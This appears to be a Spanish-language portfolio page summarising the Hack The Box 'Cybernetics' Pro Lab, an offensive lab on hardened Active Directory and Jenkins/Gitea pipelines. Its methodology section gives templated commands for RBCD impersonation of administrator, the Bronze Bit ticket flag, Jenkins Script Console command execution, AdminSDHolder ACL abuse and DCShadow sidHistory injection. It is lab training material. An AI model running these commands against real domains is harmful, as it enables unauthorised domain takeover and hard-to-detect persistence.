---
title: "Cybernetics Certified Specialist"
date: 2025-04-15
level: "Insane"
platform: "Hack The Box"
category: "Pro Lab"
duration: "Simulated Campaign"
image: "/images/about/Cybernetics.jpg"
tags: ["AD Hardening", "DevOps Security", "Kerberos", "MS Security"]
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![ProLab](https://img.shields.io/badge/Pro_Lab-Cybernetics-purple?style=for-the-badge)
![Level](https://img.shields.io/badge/Level-Insane-darkred?style=for-the-badge)
![Team](https://img.shields.io/badge/Team-CyberFlippers-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

---

| Campo | Valor |
|-------|-------|
| Pro Lab | Cybernetics |
| Plataforma | Hack The Box |
| Dificultad | Insane |
| Entorno | Hardened AD + DevOps / CI-CD |
| Enfoque | Advanced Kerberos, RBCD, Pipeline Compromise, Persistence |

## Sobre Cybernetics

**Cybernetics** es un Pro Lab de Hack The Box clasificado como **Insane**, que representa el pinnacle de la seguridad de Active Directory en la plataforma. El entorno simula una organizacion moderna **consciente de la seguridad** donde las configuraciones por defecto han sido endurecidas, el monitoreo esta activo, las rutas de ataque obvias han sido cerradas, y las mejores practicas de seguridad han sido implementadas — forzando al operador a descubrir y explotar brechas sutiles en la implementacion.

Lo que hace unico a Cybernetics es la convergencia de dos mundos: **Active Directory hardened** con configuraciones de seguridad avanzadas (Protected Users group, Credential Guard, tiered administration) y una capa de **DevOps/CI-CD** (Jenkins, Gitea) que introduce vectores de ataque no tradicionales. El operador debe navegar entre ambos paradigmas, explotando debilidades en la integracion de practicas DevOps con la infraestructura AD tradicional.

El lab exige dominio absoluto de Kerberos: ataques como Bronze Bit (CVE-2020-17049), abuso de S4U2Self/S4U2Proxy, Resource-Based Constrained Delegation (RBCD) y manipulacion avanzada de tickets son fundamentales para la progresion. Las tecnicas basicas de AD (Pass-the-Hash, Kerberoasting simple) son insuficientes contra el nivel de hardening presente.

**Vectores cubiertos:**
- **Advanced Kerberos Attacks** — Bronze Bit (CVE-2020-17049), S4U2Self abuse, manipulacion de tickets en entornos con mitigaciones activas
- **Resource-Based Constrained Delegation** — RBCD como vector primario de escalada cuando otras formas de delegacion estan restringidas
- **Protected Users Bypass** — Operaciones contra cuentas en el grupo Protected Users que no almacenan credenciales en cache ni permiten NTLM
- **CI/CD Pipeline Compromise** — Secuestro de Jenkins y repositorios Gitea para inyeccion de codigo malicioso en produccion
- **Secret Management Failures** — Extraccion de credenciales hardcodeadas en repositorios de codigo, variables de entorno de CI/CD y configuraciones de pipeline
- **Advanced Persistence** — AdminSDHolder modification, SID History injection, certificados persistentes

---

## 🔒 Confidential Assessment Profile

**Target Environment**: `Hardened Active Directory & DevOps`
**Defense Level**: `MAXIMUM`

---

## ⚔️ Tactical Competencies

### 1. Hardened AD Warfare
*   **Kerberos Mastery**: Bronze Bit Attack (CVE-2020-17049) para bypass de la validacion de forwarding de tickets en Constrained Delegation. Abuso de S4U2Self para obtener tickets de servicio en nombre de usuarios protegidos. Manipulacion avanzada de PAC (Privilege Attribute Certificate).
*   **Delegation Exploitation**: Resource-Based Constrained Delegation (RBCD) como vector principal de escalada — configuracion de msDS-AllowedToActOnBehalfOfOtherIdentity en objetos de computador para impersonar usuarios privilegiados.
*   **Protected Users Bypass**: Operaciones contra cuentas en el grupo Protected Users — estas cuentas no almacenan credenciales en cache, no permiten autenticacion NTLM ni delegacion, forzando tecnicas alternativas basadas exclusivamente en Kerberos.
*   **Credential Guard Awareness**: Operacion en entornos con Windows Credential Guard activo, donde LSASS esta protegido por virtualizacion y las tecnicas tradicionales de credential dumping fallan.
*   **Tiered Administration Model**: Navegacion de un modelo de administracion por niveles (Tier 0/1/2) donde las credenciales de cada tier estan aisladas y no pueden reutilizarse entre niveles.

### 2. DevOps & Cloud Vectors
*   **Pipeline Compromise**: Secuestro de Jenkins pipelines para inyectar codigo malicioso en el proceso de build/deploy — modificacion de Jenkinsfiles, Groovy scripts y build steps para obtener ejecucion de comandos en agentes de build.
*   **Gitea/Git Repository Exploitation**: Acceso a repositorios Git internos para extraer credenciales, tokens API y secretos hardcodeados en el historial de commits (git log, git diff de commits historicos).
*   **Secret Hunting**: Busqueda sistematica de credenciales en variables de entorno de CI/CD, archivos de configuracion, secrets managers mal configurados y archivos de pipeline.
*   **Build Agent Compromise**: Explotacion de agentes de build (Jenkins nodes/agents) como punto de pivot hacia la red interna, aprovechando las credenciales y acceso de red que los agentes necesitan para funcionar.

### 3. Advanced Persistence
*   **AdminSDHolder Abuse**: Modificacion silenciosa de la plantilla de seguridad AdminSDHolder para que el proceso SDProp (que se ejecuta cada 60 minutos) restaure automaticamente los permisos del atacante sobre objetos protegidos de AD.
*   **SID History Injection**: Mantenimiento de acceso cross-domain mediante inyeccion de SIDs privilegiados (Domain Admin, Enterprise Admin) en el atributo SID History de una cuenta controlada.
*   **Certificate-Based Persistence**: Emision de certificados de larga duracion a traves de AD CS comprometido para autenticacion persistente que sobrevive cambios de contrasena.
*   **DCShadow**: Registro temporal de un Domain Controller rogue para inyectar cambios directamente en la replicacion de AD, evitando logs de auditoria convencionales.

### 4. Advanced Enumeration in Hardened Environments
*   **Stealthy AD Enumeration**: Enumeracion de Active Directory minimizando la generacion de eventos de seguridad — LDAP queries optimizadas, recoleccion selectiva de BloodHound, evitando triggers de deteccion.
*   **Service Account Mapping**: Identificacion de cuentas de servicio asociadas a componentes DevOps (Jenkins, Gitea, runners) que frecuentemente tienen permisos excesivos en AD.
*   **Network Segmentation Analysis**: Mapeo de la segmentacion de red entre tiers de administracion, redes de DevOps y redes de produccion para identificar rutas de movimiento lateral.

## Metodologia Aplicada

### 1. Enumeracion de AD Hardened

```bash
# Enumeracion de configuracion de seguridad del dominio
Get-ADDefaultDomainPasswordPolicy
Get-ADFineGrainedPasswordPolicy -Filter *

# Identificar miembros de Protected Users
Get-ADGroupMember "Protected Users" | Select Name, SamAccountName

# Verificar Credential Guard
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# Enumeracion de delegacion (todos los tipos)
# Unconstrained
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
# Constrained
Get-ADComputer -Filter {msds-AllowedToDelegateTo -ne "$null"} -Properties msds-AllowedToDelegateTo
# RBCD
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne "$null"} \
    -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

### 2. Resource-Based Constrained Delegation (RBCD)

```bash
# Verificar MAQ (Machine Account Quota)
crackmapexec ldap <DC_IP> -u <user> -p '<pass>' -M maq

# Crear computer object
addcomputer.py -computer-name 'RBCDCOMP$' -computer-pass 'P@ssword!' \
    -dc-ip <DC_IP> <domain>/<user>:'<pass>'

# Configurar RBCD en el target
rbcd.py -delegate-to <TARGET>$ -delegate-from RBCDCOMP$ \
    -dc-ip <DC_IP> <domain>/<user>:'<pass>' -action write

# Obtener ticket de servicio impersonando administrador
getST.py -spn cifs/<TARGET>.<domain> -impersonate administrator \
    <domain>/RBCDCOMP$:'P@ssword!' -dc-ip <DC_IP>

# Acceder al target con el ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@<TARGET>.<domain>
```

### 3. Bronze Bit Attack (CVE-2020-17049)

```bash
# El Bronze Bit permite bypass de la flag "forwardable" en tickets de
# Constrained Delegation, permitiendo impersonar usuarios protegidos

# Obtener ticket con flag forwardable forzada
getST.py -spn <TARGET_SPN> -impersonate administrator \
    <domain>/<service_account>:'<pass>' -dc-ip <DC_IP> \
    -force-forwardable
```

### 4. Compromiso de Pipeline CI/CD

```bash
# Enumeracion de Jenkins (si accesible)
curl -s http://<JENKINS_IP>:8080/api/json | python3 -m json.tool

# Buscar credenciales en repositorios Git
git log --all --oneline
git log --all -p -- "*.config" "*.properties" "*.yml" "*.env" "Jenkinsfile"

# Buscar secrets en historial de commits
git log --all --diff-filter=D -- "*.key" "*.pem" "*.p12"
trufflehog git file://./repo/

# Ejecucion de comandos via Jenkins Script Console (si hay acceso)
# POST a /script con Groovy:
# def cmd = "whoami".execute(); println(cmd.text)
```

### 5. Persistencia Avanzada

```powershell
# AdminSDHolder Abuse
# Agregar ACE al contenedor AdminSDHolder (CN=AdminSDHolder,CN=System,DC=...)
# SDProp propaga los permisos cada ~60 minutos a todos los objetos protegidos
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' \
    -PrincipalIdentity <controlled_user> -Rights All

# DCShadow (registro temporal de DC rogue)
# Requiere privilegios de Domain Admin
# Permite inyectar cambios en la replicacion sin logs estandar
lsadump::dcshadow /object:<target_dn> /attribute:sidHistory /value:<privileged_SID>
```

## Herramientas Utilizadas

| Herramienta | Proposito |
|-------------|-----------|
| `BloodHound / SharpHound` | Mapeo de rutas de ataque en AD hardened |
| `Impacket (getST, addcomputer, rbcd, secretsdump)` | RBCD, Kerberos attacks, credential dumping |
| `Rubeus` | Bronze Bit, S4U2Self/S4U2Proxy, ticket manipulation |
| `Certipy` | Enumeracion y explotacion de AD CS |
| `PowerView / ADModule` | Enumeracion de AD, ACLs y delegaciones |
| `CrackMapExec / NetExec` | Enumeracion multi-protocolo y ejecucion remota |
| `trufflehog / git-secrets` | Deteccion de secrets en repositorios Git |
| `Jenkins CLI / Script Console` | Interaccion con pipelines CI/CD |
| `Mimikatz` | Credential extraction, DCShadow, ticket forging |
| `Chisel / Ligolo-ng` | Pivoting entre segmentos de red |

## Key Takeaways

1. **El hardening reduce la superficie pero no la elimina** — Incluso con Protected Users, Credential Guard y tiered administration, las misconfiguraciones sutiles en delegacion y ACLs proporcionan rutas de compromiso.
2. **DevOps es el nuevo perimetro** — Los pipelines de CI/CD procesan codigo y credenciales con acceso privilegiado a la infraestructura. Un Jenkins comprometido puede ser mas peligroso que un Domain Controller expuesto.
3. **RBCD es el ataque de delegacion mas versatil** — Cuando Unconstrained y Constrained Delegation estan restringidas, RBCD sigue siendo viable porque solo requiere control sobre el atributo de un objeto de computador.
4. **Bronze Bit cambio las reglas de Constrained Delegation** — CVE-2020-17049 demostro que la flag "forwardable" en tickets Kerberos no era un control de seguridad confiable, ampliando significativamente el impacto de Constrained Delegation abuse.
5. **La persistencia a nivel de AD es la mas dificil de erradicar** — AdminSDHolder, SID History y certificados persistentes requieren una investigacion forense profunda para detectar y remediar completamente.

---

## 🏆 Operational Impact

Certifica la habilidad de **operar en entornos maduros**, donde la seguridad es prioridad organizacional. Valida la competencia para atacar infraestructuras modernas que combinan Active Directory hardened con practicas de DevOps, demostrando que el operador puede encontrar y explotar brechas sutiles en implementaciones que siguen las mejores practicas de la industria — exactamente el tipo de entorno que representa a organizaciones con equipos de seguridad dedicados y programas de defensa activa.

---

<div align="center">

**Flippermen**
*HackTheBox — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
